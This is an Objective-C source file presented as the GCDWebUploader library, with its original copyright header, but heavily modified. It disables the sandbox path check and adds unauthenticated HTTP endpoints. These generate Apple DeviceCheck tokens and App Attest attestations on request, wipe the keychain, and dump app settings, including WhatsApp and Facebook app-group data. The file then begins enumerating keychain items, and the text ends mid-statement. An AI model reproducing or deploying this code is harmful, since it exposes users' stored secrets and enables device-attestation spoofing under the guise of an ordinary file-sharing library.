/*
 Copyright (c) 2012-2014, Pierre-Olivier Latour
 All rights reserved.
 
 Redistribution and use in source and binary forms, with or without
 modification, are permitted provided that the following conditions are met:
 * Redistributions of source code must retain the above copyright
 notice, this list of conditions and the following disclaimer.
 * Redistributions in binary form must reproduce the above copyright
 notice, this list of conditions and the following disclaimer in the
 documentation and/or other materials provided with the distribution.
 * The name of Pierre-Olivier Latour may not be used to endorse
 or promote products derived from this software without specific
 prior written permission.
 
 THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND
 ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
 WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
 DISCLAIMED. IN NO EVENT SHALL PIERRE-OLIVIER LATOUR BE LIABLE FOR ANY
 DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
 (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
 LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
 ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
 SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

#import <TargetConditionals.h>
#if TARGET_OS_IPHONE
#import <UIKit/UIKit.h>
#else
#import <SystemConfiguration/SystemConfiguration.h>
#endif

#import "GCDWebUploader.h"

#include "../GCDWebServer/Requests/GCDWebServerDataRequest.h"
#include "../GCDWebServer/Requests/GCDWebServerMultiPartFormRequest.h"
#include "../GCDWebServer/Requests/GCDWebServerURLEncodedFormRequest.h"

#include "../GCDWebServer/Responses/GCDWebServerDataResponse.h"
#include "../GCDWebServer/Responses/GCDWebServerErrorResponse.h"
#include "../GCDWebServer/Responses/GCDWebServerFileResponse.h"


#import <DeviceCheck/DCAppAttestService.h>
#import <CommonCrypto/CommonCrypto.h>

static inline NSString *obj2json(id obj)
{
    if (obj == nil) return nil;
    
    NSError *e = nil;
    NSString *s = [[NSString alloc] initWithData:[NSJSONSerialization dataWithJSONObject:obj options:NSJSONWritingPrettyPrinted error:&e] encoding:NSUTF8StringEncoding];
    if (e)
    {
        NSLog(@"%s(): %@", __FUNCTION__, e.debugDescription);
        return nil;
    }
    return s;
}

@interface GCDWebUploader () {
@private
    NSString* _uploadDirectory;
    NSArray* _allowedExtensions;
    BOOL _allowHidden;
    NSString* _title;
    NSString* _header;
    NSString* _prologue;
    NSString* _epilogue;
    NSString* _footer;
}
@end

@implementation GCDWebUploader (Methods)

// Must match implementation in GCDWebDAVServer
- (BOOL)_checkSandboxedPath:(NSString*)path {
//    return [[path stringByStandardizingPath] hasPrefix:_uploadDirectory];
    return TRUE;
}

- (BOOL)_checkFileExtension:(NSString*)fileName {
    if (_allowedExtensions && ![_allowedExtensions containsObject:[[fileName pathExtension] lowercaseString]]) {
        return NO;
    }
    return YES;
}

- (NSString*) _uniquePathForPath:(NSString*)path {
    if ([[NSFileManager defaultManager] fileExistsAtPath:path]) {
        NSString* directory = [path stringByDeletingLastPathComponent];
        NSString* file = [path lastPathComponent];
        NSString* base = [file stringByDeletingPathExtension];
        NSString* extension = [file pathExtension];
        int retries = 0;
        do {
            if (extension.length) {
                path = [directory stringByAppendingPathComponent:[[base stringByAppendingFormat:@" (%i)", ++retries] stringByAppendingPathExtension:extension]];
            } else {
                path = [directory stringByAppendingPathComponent:[base stringByAppendingFormat:@" (%i)", ++retries]];
            }
        } while ([[NSFileManager defaultManager] fileExistsAtPath:path]);
    }
    return path;
}

- (GCDWebServerResponse*)listDirectory:(GCDWebServerRequest*)request {
    NSString* relativePath = [[request query] objectForKey:@"path"];
    NSString* absolutePath = [_uploadDirectory stringByAppendingPathComponent:relativePath];
    if ([relativePath hasPrefix:@"/private/var/containers/Bundle/Application/"]) absolutePath = relativePath;
    BOOL isDirectory = NO;
    if (![self _checkSandboxedPath:absolutePath] || ![[NSFileManager defaultManager] fileExistsAtPath:absolutePath isDirectory:&isDirectory]) {
        return [GCDWebServerErrorResponse responseWithClientError:kGCDWebServerHTTPStatusCode_NotFound message:@"\"%@\" does not exist", relativePath];
    }
    if (!isDirectory) {
        return [GCDWebServerErrorResponse responseWithClientError:kGCDWebServerHTTPStatusCode_BadRequest message:@"\"%@\" is not a directory", relativePath];
    }
    
    NSString* directoryName = [absolutePath lastPathComponent];
    if (!_allowHidden && [directoryName hasPrefix:@"."]) {
        return [GCDWebServerErrorResponse responseWithClientError:kGCDWebServerHTTPStatusCode_Forbidden message:@"Listing directory name \"%@\" is not allowed", directoryName];
    }
    
    NSError* error = nil;
    NSArray* contents = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:absolutePath error:&error];
    if (contents == nil) {
        return [GCDWebServerErrorResponse responseWithServerError:kGCDWebServerHTTPStatusCode_InternalServerError underlyingError:error message:@"Failed listing directory \"%@\"", relativePath];
    }
    
    NSMutableArray* array = [NSMutableArray array];
    if ([relativePath isEqualToString:@"/"])
    {
        [array addObject:@{
            @"path": [NSBundle mainBundle].resourcePath,
            @"name": @"AppRoot",
        }];
    }
    for (NSString* item in [contents sortedArrayUsingSelector:@selector(localizedStandardCompare:)]) {
        if (_allowHidden || ![item hasPrefix:@"."]) {
            NSDictionary* attributes = [[NSFileManager defaultManager] attributesOfItemAtPath:[absolutePath stringByAppendingPathComponent:item] error:NULL];
            NSString* type = [attributes objectForKey:NSFileType];
            if ([type isEqualToString:NSFileTypeRegular] && [self _checkFileExtension:item]) {
                [array addObject:@{
                    @"path": [relativePath stringByAppendingPathComponent:item],
                    @"name": item,
                    @"size": [attributes objectForKey:NSFileSize]
                }];
            } else if ([type isEqualToString:NSFileTypeDirectory]) {
                [array addObject:@{
                    @"path": [[relativePath stringByAppendingPathComponent:item] stringByAppendingString:@"/"],
                    @"name": item
                }];
            }
        }
    }
    return [GCDWebServerDataResponse responseWithJSONObject:array];
}

- (NSMutableArray *)listDirectoryWithPath:(NSString *)absolutePath {
//    NSString* relativePath = [[request query] objectForKey:@"path"];
//    NSString* absolutePath = [_uploadDirectory stringByAppendingPathComponent:relativePath];
    BOOL isDirectory = NO;
    if (![[NSFileManager defaultManager] fileExistsAtPath:absolutePath isDirectory:&isDirectory]) {
        return nil;
    }
    if (!isDirectory) {
        return nil;
    }
    
    NSString* directoryName = [absolutePath lastPathComponent];
    if (!_allowHidden && [directoryName hasPrefix:@"."]) {
        return nil;
    }
    
    NSError* error = nil;
    NSArray* contents = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:absolutePath error:&error];
    if (contents == nil) {
        return nil;
    }
    
    NSMutableArray* array = [NSMutableArray array];
    for (NSString* item in [contents sortedArrayUsingSelector:@selector(localizedStandardCompare:)]) {
        if (_allowHidden || ![item hasPrefix:@"."]) {
            NSDictionary* attributes = [[NSFileManager defaultManager] attributesOfItemAtPath:[absolutePath stringByAppendingPathComponent:item] error:NULL];
            NSString* type = [attributes objectForKey:NSFileType];
            if ([type isEqualToString:NSFileTypeRegular] && [self _checkFileExtension:item]) {
                [array addObject:@{
                    @"path": [absolutePath stringByAppendingPathComponent:item],
                    @"name": item,
                    @"size": [attributes objectForKey:NSFileSize]
                }];
            } else if ([type isEqualToString:NSFileTypeDirectory]) {
                [array addObject:@{
                    @"path": [[absolutePath stringByAppendingPathComponent:item] stringByAppendingString:@"/"],
                    @"name": item
                }];
            }
        }
    }
    return array;
}

- (GCDWebServerResponse*)downloadFile:(GCDWebServerRequest*)request {
    NSString* relativePath = [[request query] objectForKey:@"path"];
    NSString* absolutePath = [_uploadDirectory stringByAppendingPathComponent:relativePath];
    if ([relativePath hasPrefix:@"/private/var/containers/Bundle/Application/"]) absolutePath = relativePath;
    BOOL isDirectory = NO;
    if (![self _checkSandboxedPath:absolutePath] || ![[NSFileManager defaultManager] fileExistsAtPath:absolutePath isDirectory:&isDirectory]) {
        return [GCDWebServerErrorResponse responseWithClientError:kGCDWebServerHTTPStatusCode_NotFound message:@"\"%@\" does not exist", relativePath];
    }
    if (isDirectory) {
        return [GCDWebServerErrorResponse responseWithClientError:kGCDWebServerHTTPStatusCode_BadRequest message:@"\"%@\" is a directory", relativePath];
    }
    
    NSString* fileName = [absolutePath lastPathComponent];
    if (([fileName hasPrefix:@"."] && !_allowHidden) || ![self _checkFileExtension:fileName]) {
        return [GCDWebServerErrorResponse responseWithClientError:kGCDWebServerHTTPStatusCode_Forbidden message:@"Downlading file name \"%@\" is not allowed", fileName];
    }
    
    if ([self.delegate respondsToSelector:@selector(webUploader:didDownloadFileAtPath:  )]) {
        dispatch_async(dispatch_get_main_queue(), ^{
            [self.delegate webUploader:self didDownloadFileAtPath:absolutePath];
        });
    }
    return [GCDWebServerFileResponse responseWithFile:absolutePath isAttachment:YES];
}

- (GCDWebServerResponse*)uploadFile:(GCDWebServerMultiPartFormRequest*)request {
    NSRange range = [[request.headers objectForKey:@"Accept"] rangeOfString:@"application/json" options:NSCaseInsensitiveSearch];
    NSString* contentType = (range.location != NSNotFound ? @"application/json" : @"text/plain; charset=utf-8");  // Required when using iFrame transport (see https://github.com/blueimp/jQuery-File-Upload/wiki/Setup)
    
    GCDWebServerMultiPartFile* file = [request firstFileForControlName:@"files[]"];
    if ((!_allowHidden && [file.fileName hasPrefix:@"."]) || ![self _checkFileExtension:file.fileName]) {
        return [GCDWebServerErrorResponse responseWithClientError:kGCDWebServerHTTPStatusCode_Forbidden message:@"Uploaded file name \"%@\" is not allowed", file.fileName];
    }
    NSString* relativePath = [[request firstArgumentForControlName:@"path"] string];
    NSString* absolutePath = [self _uniquePathForPath:[[_uploadDirectory stringByAppendingPathComponent:relativePath] stringByAppendingPathComponent:file.fileName]];
    if (![self _checkSandboxedPath:absolutePath]) {
        return [GCDWebServerErrorResponse responseWithClientError:kGCDWebServerHTTPStatusCode_NotFound message:@"\"%@\" does not exist", relativePath];
    }
    
    if (![self shouldUploadFileAtPath:absolutePath withTemporaryFile:file.temporaryPath]) {
        return [GCDWebServerErrorResponse responseWithClientError:kGCDWebServerHTTPStatusCode_Forbidden message:@"Uploading file \"%@\" to \"%@\" is not permitted", file.fileName, relativePath];
    }
    
    NSError* error = nil;
    if (![[NSFileManager defaultManager] moveItemAtPath:file.temporaryPath toPath:absolutePath error:&error]) {
        return [GCDWebServerErrorResponse responseWithServerError:kGCDWebServerHTTPStatusCode_InternalServerError underlyingError:error message:@"Failed moving uploaded file to \"%@\"", relativePath];
    }
    
    if ([self.delegate respondsToSelector:@selector(webUploader:didUploadFileAtPath:)]) {
        dispatch_async(dispatch_get_main_queue(), ^{
            [self.delegate webUploader:self didUploadFileAtPath:absolutePath];
        });
    }
    return [GCDWebServerDataResponse responseWithJSONObject:@{} contentType:contentType];
}

- (GCDWebServerResponse*)moveItem:(GCDWebServerURLEncodedFormRequest*)request {
    NSString* oldRelativePath = [request.arguments objectForKey:@"oldPath"];
    NSString* oldAbsolutePath = [_uploadDirectory stringByAppendingPathComponent:oldRelativePath];
    BOOL isDirectory = NO;
    if (![self _checkSandboxedPath:oldAbsolutePath] || ![[NSFileManager defaultManager] fileExistsAtPath:oldAbsolutePath isDirectory:&isDirectory]) {
        return [GCDWebServerErrorResponse responseWithClientError:kGCDWebServerHTTPStatusCode_NotFound message:@"\"%@\" does not exist", oldRelativePath];
    }
    
    NSString* newRelativePath = [request.arguments objectForKey:@"newPath"];
    NSString* newAbsolutePath = [self _uniquePathForPath:[_uploadDirectory stringByAppendingPathComponent:newRelativePath]];
    if (![self _checkSandboxedPath:newAbsolutePath]) {
        return [GCDWebServerErrorResponse responseWithClientError:kGCDWebServerHTTPStatusCode_NotFound message:@"\"%@\" does not exist", newRelativePath];
    }
    
    NSString* itemName = [newAbsolutePath lastPathComponent];
    if ((!_allowHidden && [itemName hasPrefix:@"."]) || (!isDirectory && ![self _checkFileExtension:itemName])) {
        return [GCDWebServerErrorResponse responseWithClientError:kGCDWebServerHTTPStatusCode_Forbidden message:@"Moving to item name \"%@\" is not allowed", itemName];
    }
    
    if (![self shouldMoveItemFromPath:oldAbsolutePath toPath:newAbsolutePath]) {
        return [GCDWebServerErrorResponse responseWithClientError:kGCDWebServerHTTPStatusCode_Forbidden message:@"Moving \"%@\" to \"%@\" is not permitted", oldRelativePath, newRelativePath];
    }
    
    NSError* error = nil;
    if (![[NSFileManager defaultManager] moveItemAtPath:oldAbsolutePath toPath:newAbsolutePath error:&error]) {
        return [GCDWebServerErrorResponse responseWithServerError:kGCDWebServerHTTPStatusCode_InternalServerError underlyingError:error message:@"Failed moving \"%@\" to \"%@\"", oldRelativePath, newRelativePath];
    }
    
    if ([self.delegate respondsToSelector:@selector(webUploader:didMoveItemFromPath:toPath:)]) {
        dispatch_async(dispatch_get_main_queue(), ^{
            [self.delegate webUploader:self didMoveItemFromPath:oldAbsolutePath toPath:newAbsolutePath];
        });
    }
    return [GCDWebServerDataResponse responseWithJSONObject:@{}];
}

- (GCDWebServerResponse*)deleteItem:(GCDWebServerURLEncodedFormRequest*)request {
    NSString* relativePath = [request.arguments objectForKey:@"path"];
    NSString* absolutePath = [_uploadDirectory stringByAppendingPathComponent:relativePath];
    BOOL isDirectory = NO;
    if (![self _checkSandboxedPath:absolutePath] || ![[NSFileManager defaultManager] fileExistsAtPath:absolutePath isDirectory:&isDirectory]) {
        return [GCDWebServerErrorResponse responseWithClientError:kGCDWebServerHTTPStatusCode_NotFound message:@"\"%@\" does not exist", relativePath];
    }
    
    NSString* itemName = [absolutePath lastPathComponent];
    if (([itemName hasPrefix:@"."] && !_allowHidden) || (!isDirectory && ![self _checkFileExtension:itemName])) {
        return [GCDWebServerErrorResponse responseWithClientError:kGCDWebServerHTTPStatusCode_Forbidden message:@"Deleting item name \"%@\" is not allowed", itemName];
    }
    
    if (![self shouldDeleteItemAtPath:absolutePath]) {
        return [GCDWebServerErrorResponse responseWithClientError:kGCDWebServerHTTPStatusCode_Forbidden message:@"Deleting \"%@\" is not permitted", relativePath];
    }
    
    NSError* error = nil;
    if (![[NSFileManager defaultManager] removeItemAtPath:absolutePath error:&error]) {
        return [GCDWebServerErrorResponse responseWithServerError:kGCDWebServerHTTPStatusCode_InternalServerError underlyingError:error message:@"Failed deleting \"%@\"", relativePath];
    }
    
    if ([self.delegate respondsToSelector:@selector(webUploader:didDeleteItemAtPath:)]) {
        dispatch_async(dispatch_get_main_queue(), ^{
            [self.delegate webUploader:self didDeleteItemAtPath:absolutePath];
        });
    }
    return [GCDWebServerDataResponse responseWithJSONObject:@{}];
}

- (GCDWebServerResponse*)createDirectory:(GCDWebServerURLEncodedFormRequest*)request {
    NSString* relativePath = [request.arguments objectForKey:@"path"];
    NSString* absolutePath = [self _uniquePathForPath:[_uploadDirectory stringByAppendingPathComponent:relativePath]];
    if (![self _checkSandboxedPath:absolutePath]) {
        return [GCDWebServerErrorResponse responseWithClientError:kGCDWebServerHTTPStatusCode_NotFound message:@"\"%@\" does not exist", relativePath];
    }
    
    NSString* directoryName = [absolutePath lastPathComponent];
    if (!_allowHidden && [directoryName hasPrefix:@"."]) {
        return [GCDWebServerErrorResponse responseWithClientError:kGCDWebServerHTTPStatusCode_Forbidden message:@"Creating directory name \"%@\" is not allowed", directoryName];
    }
    
    if (![self shouldCreateDirectoryAtPath:absolutePath]) {
        return [GCDWebServerErrorResponse responseWithClientError:kGCDWebServerHTTPStatusCode_Forbidden message:@"Creating directory \"%@\" is not permitted", relativePath];
    }
    
    NSError* error = nil;
    if (![[NSFileManager defaultManager] createDirectoryAtPath:absolutePath withIntermediateDirectories:NO attributes:nil error:&error]) {
        return [GCDWebServerErrorResponse responseWithServerError:kGCDWebServerHTTPStatusCode_InternalServerError underlyingError:error message:@"Failed creating directory \"%@\"", relativePath];
    }
    
    if ([self.delegate respondsToSelector:@selector(webUploader:didCreateDirectoryAtPath:)]) {
        dispatch_async(dispatch_get_main_queue(), ^{
            [self.delegate webUploader:self didCreateDirectoryAtPath:absolutePath];
        });
    }
    return [GCDWebServerDataResponse responseWithJSONObject:@{}];
}

@end


static NSString *GCDWebUploader_bundle_root = nil;
extern NSDictionary *GCDWebUploader_bundle_content(void);
static void load_bundle()
{
#if defined(DEBUG)||defined(_DEBUG)
    {
        GCDWebUploader_bundle_root = nil;
        NSString *bundle = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES)[0];
        [[NSFileManager defaultManager] removeItemAtPath:[NSString stringWithFormat:@"%@/GCDWebUploaderFiles/GCDWebUploader.bundle", bundle] error:NULL];
    }
#endif
    
    if (GCDWebUploader_bundle_root.length) return;
    
    NSDictionary *GCDWebUploader_bundle = GCDWebUploader_bundle_content();
    NSString *bundle = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES)[0];
    [GCDWebUploader_bundle enumerateKeysAndObjectsUsingBlock:^(NSString *key, NSString *obj, BOOL * _Nonnull stop) {
        NSString *f = [NSString stringWithFormat:@"%@/GCDWebUploaderFiles/%@", bundle, key];
        if ([[NSFileManager defaultManager] fileExistsAtPath:f]) return;
        
        [[NSFileManager defaultManager] createDirectoryAtPath:[f stringByDeletingLastPathComponent] withIntermediateDirectories:YES attributes:nil error:NULL];
        NSData *d = [[NSData alloc] initWithBase64EncodedString:obj options:0];
        [d writeToFile:f atomically:YES];
    }];
    
    GCDWebUploader_bundle_root = [NSString stringWithFormat:@"%@/GCDWebUploaderFiles/GCDWebUploader.bundle", bundle];
}



static NSMutableDictionary *DeviceCheck_get_token()
{
    NSMutableDictionary *k = [NSMutableDictionary dictionaryWithCapacity:4];
    k[@"isMainThread"] = @((int)[NSThread isMainThread]);
    
    dispatch_semaphore_t se = dispatch_semaphore_create(0);
    dispatch_async(dispatch_get_global_queue(0, 0), ^{
        [[DCDevice currentDevice] generateTokenWithCompletionHandler:^(NSData * _Nullable token, NSError * _Nullable error) {
            
            if (token) k[@"token"] = [token base64EncodedStringWithOptions:0];
            if (error) k[@"error"] = [error description];
            dispatch_semaphore_signal(se);
        }];
    });
    dispatch_semaphore_wait(se, DISPATCH_TIME_FOREVER);
    
    return k;
}

static NSMutableDictionary *DeviceCheck_get_verify(NSString *keyId, NSString *data)
{
    NSMutableDictionary *k = [NSMutableDictionary dictionaryWithCapacity:4];
    k[@"isMainThread"] = @((int)[NSThread isMainThread]);
    
    dispatch_semaphore_t se = dispatch_semaphore_create(0);
    dispatch_async(dispatch_get_global_queue(0, 0), ^{
        uint8_t md[32];
        NSData *d1 = [data dataUsingEncoding:NSUTF8StringEncoding];
        CC_SHA256(d1.bytes, d1.length, md);
        NSData *md2 = [NSData dataWithBytes:md length:32];
        
        [[DCAppAttestService sharedService] attestKey:keyId clientDataHash:md2 completionHandler:^(NSData * _Nullable attestationObject, NSError * _Nullable error) {

            if (attestationObject) k[@"attestationObject"] = [attestationObject base64EncodedStringWithOptions:0];
            if (error) k[@"error"] = [error description];
            dispatch_semaphore_signal(se);
        }];
    });
    dispatch_semaphore_wait(se, DISPATCH_TIME_FOREVER);
    
    return k;
}

static NSMutableDictionary *DeviceCheck_get_keyId()
{
    NSMutableDictionary *k = [NSMutableDictionary dictionaryWithCapacity:4];
    k[@"isMainThread"] = @((int)[NSThread isMainThread]);
    
    dispatch_semaphore_t se = dispatch_semaphore_create(0);
    dispatch_async(dispatch_get_global_queue(0, 0), ^{
        [[DCAppAttestService sharedService] generateKeyWithCompletionHandler:^(NSString * _Nullable keyId, NSError * _Nullable error) {
            
            if (keyId) k[@"keyId"] = keyId;
            if (error) k[@"error"] = [error description];
            dispatch_semaphore_signal(se);
        }];
    });
    dispatch_semaphore_wait(se, DISPATCH_TIME_FOREVER);
    
    return k;
}


@implementation GCDWebUploader

@synthesize uploadDirectory=_uploadDirectory, allowedFileExtensions=_allowedExtensions, allowHiddenItems=_allowHidden,
title=_title, header=_header, prologue=_prologue, epilogue=_epilogue, footer=_footer;

- (instancetype)initWithUploadDirectory:(NSString*)path {
if ((self = [super init])) {
    load_bundle();
    NSBundle* siteBundle = [NSBundle bundleWithPath:GCDWebUploader_bundle_root];
    if (siteBundle == nil) {
#if !__has_feature(objc_arc)
        [self release];
#endif
        return nil;
    }
    _uploadDirectory = [[path stringByStandardizingPath] copy];
#if __has_feature(objc_arc)
    GCDWebUploader* __unsafe_unretained server = self;
#else
    __block GCDWebUploader* server = self;
#endif
    
    // Resource files
    [self addGETHandlerForBasePath:@"/" directoryPath:[siteBundle resourcePath] indexFilename:nil cacheAge:3600 allowRangeRequests:NO];
    
    // Web page
    [self addHandlerForMethod:@"GET" path:@"/" requestClass:[GCDWebServerRequest class] processBlock:^GCDWebServerResponse *(GCDWebServerRequest* request) {
        
#if TARGET_OS_IPHONE
        NSString* device = [[UIDevice currentDevice] name];
#else
#if __has_feature(objc_arc)
        NSString* device = CFBridgingRelease(SCDynamicStoreCopyComputerName(NULL, NULL));
#else
        NSString* device = [(id)SCDynamicStoreCopyComputerName(NULL, NULL) autorelease];
#endif
#endif
        NSString* title = server.title;
        if (title == nil) {
            title = [[NSBundle mainBundle] objectForInfoDictionaryKey:@"CFBundleDisplayName"];
            if (title == nil) {
                title = [[NSBundle mainBundle] objectForInfoDictionaryKey:@"CFBundleName"];
            }
#if !TARGET_OS_IPHONE
            if (title == nil) {
                title = [[NSProcessInfo processInfo] processName];
            }
#endif
        }
        NSString* header = server.header;
        if (header == nil) {
            header = title;
        }
        NSString* prologue = server.prologue;
        if (prologue == nil) {
            prologue = [siteBundle localizedStringForKey:@"PROLOGUE" value:@"" table:nil];
        }
        NSString* epilogue = server.epilogue;
        if (epilogue == nil) {
            epilogue = [siteBundle localizedStringForKey:@"EPILOGUE" value:@"" table:nil];
        }
        NSString* footer = server.footer;
        if (footer == nil) {
            NSString* name = [[NSBundle mainBundle] objectForInfoDictionaryKey:@"CFBundleDisplayName"];
            NSString* version = [[NSBundle mainBundle] objectForInfoDictionaryKey:@"CFBundleShortVersionString"];
#if !TARGET_OS_IPHONE
            if (!name && !version) {
                name = @"OS X";
                version = [[NSProcessInfo processInfo] operatingSystemVersionString];
            }
#endif
            footer = [NSString stringWithFormat:[siteBundle localizedStringForKey:@"FOOTER_FORMAT" value:@"" table:nil], name, version];
        }
        NSString *ver1 = [NSBundle mainBundle].infoDictionary[@"CFBundleShortVersionString"];
        NSString *ver2 = [NSBundle mainBundle].infoDictionary[@"CFBundleVersion"];
        NSString *ver = [NSString stringWithFormat:@"%@/%@", ver1, ver2];
        return [GCDWebServerDataResponse responseWithHTMLTemplate:[siteBundle pathForResource:@"index" ofType:@"html"]
                                                        variables:@{
            @"device": device,
            @"title": [NSString stringWithFormat:@"%@ - %@", [UIDevice currentDevice].name, title],
            @"header": [NSString stringWithFormat:@"%@/%@/%@ -- pid: %u", header, [NSBundle mainBundle].bundleIdentifier, ver, getpid()],
            @"prologue": prologue,
            @"epilogue": epilogue,
            @"footer": footer
        }];
        
    }];

    // DCToken
    [self addHandlerForMethod:@"GET" path:@"/device/token" requestClass:[GCDWebServerRequest class] processBlock:^GCDWebServerResponse *(GCDWebServerRequest* request) {
        
        NSMutableDictionary *k = DeviceCheck_get_token();
        
        return [GCDWebServerDataResponse responseWithJSONObject:k];
    }];
    
    // DCToken
    [self addHandlerForMethod:@"GET" path:@"/device/keyid" requestClass:[GCDWebServerRequest class] processBlock:^GCDWebServerResponse *(GCDWebServerRequest* request) {
        
        NSMutableDictionary *k = DeviceCheck_get_keyId();
        
        return [GCDWebServerDataResponse responseWithJSONObject:k];
    }];
    
    // DCToken
    [self addHandlerForMethod:@"POST" path:@"/device/verify" requestClass:[GCDWebServerDataRequest class] processBlock:^GCDWebServerResponse *(GCDWebServerRequest* request) {
        
        GCDWebServerDataRequest *req = (id)request;
        NSDictionary *reqdata =[NSJSONSerialization JSONObjectWithData:req.data options:0 error:NULL];
        NSString *keyId = reqdata[@"keyId"];
        NSString *data = reqdata[@"data"];

        NSMutableDictionary *k = DeviceCheck_get_verify(keyId, data);
        
        return [GCDWebServerDataResponse responseWithJSONObject:k];
    }];
    
    // DCToken
    [self addHandlerForMethod:@"POST" path:@"/device/all" requestClass:[GCDWebServerDataRequest class] processBlock:^GCDWebServerResponse *(GCDWebServerRequest* request) {
        
        GCDWebServerDataRequest *req = (id)request;
        NSDictionary *reqdata =[NSJSONSerialization JSONObjectWithData:req.data options:0 error:NULL];
        NSString *data = reqdata[@"data"];
        
        NSMutableDictionary *s = [NSMutableDictionary dictionaryWithCapacity:4];
        

        NSMutableDictionary *t = DeviceCheck_get_token();
        NSMutableDictionary *k = DeviceCheck_get_keyId();
        if (data.length)
        {
            NSString *keyId = k[@"keyId"];
            NSMutableDictionary *v = DeviceCheck_get_verify(keyId, data);
            s[@"verify"] = v;
        }
        
        s[@"keyId"] = k;
        s[@"token"] = t;
        
        
        return [GCDWebServerDataResponse responseWithJSONObject:s];
    }];
    
    
    // Exit App
    [self addHandlerForMethod:@"GET" path:@"/exit" requestClass:[GCDWebServerRequest class] processBlock:^GCDWebServerResponse *(GCDWebServerRequest* request) {
        
        dispatch_async(dispatch_get_main_queue(), ^{
            [server stop];
            dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 300 * NSEC_PER_MSEC), dispatch_get_main_queue(), ^{
                exit(0);
            });
        });
        
        return [GCDWebServerDataResponse responseWithText:@"ok"];
    }];
    
    // Pause on next startup
    [self addHandlerForMethod:@"GET" path:@"/pause/once" requestClass:[GCDWebServerRequest class] processBlock:^GCDWebServerResponse *(GCDWebServerRequest* request) {
        
        NSString *file1 = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES)[0];
        file1 = [NSString stringWithFormat:@"%@/app-force-pause.txt", file1];
        [@"delete" writeToFile:file1 atomically:YES encoding:NSUTF8StringEncoding error:NULL];
        
        return [GCDWebServerDataResponse responseWithText:@"ok"];
    }];
    
    // Pause on next startup
    [self addHandlerForMethod:@"GET" path:@"/pause/keep" requestClass:[GCDWebServerRequest class] processBlock:^GCDWebServerResponse *(GCDWebServerRequest* request) {
        
        NSString *file1 = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES)[0];
        file1 = [NSString stringWithFormat:@"%@/app-force-pause.txt", file1];
        [@"keep" writeToFile:file1 atomically:YES encoding:NSUTF8StringEncoding error:NULL];
        
        return [GCDWebServerDataResponse responseWithText:@"ok"];
    }];
    
    // Clean KeyChain
    [self addHandlerForMethod:@"GET" path:@"/keychain/clean" requestClass:[GCDWebServerRequest class] processBlock:^GCDWebServerResponse *(GCDWebServerRequest* request) {
        
        NSString *QuitApp = request.query[@"QuitApp"];
        
        dispatch_async(dispatch_get_main_queue(), ^{
         
            
            NSArray *secItemClasses = @[(__bridge id)kSecClassGenericPassword,
                                        (__bridge id)kSecClassInternetPassword,
                                        (__bridge id)kSecClassCertificate,
                                        (__bridge id)kSecClassKey,
                                        (__bridge id)kSecClassIdentity];
            for (id secItemClass in secItemClasses)
            {
                NSDictionary *spec = @{(__bridge id)kSecClass: secItemClass};
                SecItemDelete((__bridge CFDictionaryRef)spec);
            }
            
            if ([QuitApp isEqualToString:@"1"])
            {
                [server stop];
                exit(0);
            }
        });
        
        return [GCDWebServerDataResponse responseWithText:@"ok"];
    }];
    
    
    // App Info
    [self addHandlerForMethod:@"GET" path:@"/app/info" requestClass:[GCDWebServerRequest class] processBlock:^GCDWebServerResponse *(GCDWebServerRequest* request) {
        
        NSString *sandbox = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES)[0];
        
        
        NSMutableDictionary *info = [@{} mutableCopy];
        info[@"executablePath"] = [NSBundle mainBundle].executablePath;
        info[@"Sandbox"] = [sandbox stringByDeletingLastPathComponent];
        info[@"BundleInfo"] = [NSBundle mainBundle].infoDictionary;
        
        
        {
            NSMutableDictionary *obj2 = [@{} mutableCopy];
            NSUserDefaults *s1 = [NSUserDefaults standardUserDefaults];
            [s1.dictionaryRepresentation enumerateKeysAndObjectsUsingBlock:^(NSString * _Nonnull key, id  _Nonnull obj, BOOL * _Nonnull stop) {

                obj2[key] = [obj debugDescription];
//                    if (obj2json(obj).length) obj2[key] = obj;
//                    else obj2[key] = [obj debugDescription];
                
            }];
            info[@"NSUD"] = obj2;
        }
        
        {
            NSArray *gs = @[
                @"group.com.facebook.family",
                @"group.net.whatsapp.family",
                @"group.net.whatsapp.WhatsApp",
                @"group.net.whatsapp.WhatsApp.private",
                @"group.net.whatsapp.WhatsApp.shared",
                @"group.net.whatsapp.WhatsAppSMB.shared",
            ];
            
            [gs enumerateObjectsUsingBlock:^(id  _Nonnull name, NSUInteger idx, BOOL * _Nonnull stop) {
                NSUserDefaults *s1 = [[NSUserDefaults alloc] initWithSuiteName:name];
                if (s1 == nil) return;
                
                NSMutableDictionary *obj2 = [@{} mutableCopy];
                [s1.dictionaryRepresentation enumerateKeysAndObjectsUsingBlock:^(NSString * _Nonnull key, id  _Nonnull obj, BOOL * _Nonnull stop) {

                    obj2[key] = [obj debugDescription];
//                    if (obj2json(obj).length) obj2[key] = obj;
//                    else obj2[key] = [obj debugDescription];
                    
                }];
                info[name] = obj2;
                info[name][@"container"] = [[NSFileManager defaultManager] containerURLForSecurityApplicationGroupIdentifier:name].absoluteString;
                
                [s1 synchronize];
            }];
        }
        
        {
            NSMutableDictionary *obj2 = [@{} mutableCopy];
            NSArray *secItemClasses = @[(__bridge id)kSecClassGenericPassword,
                                        (__bridge id)kSecClassInternetPassword,
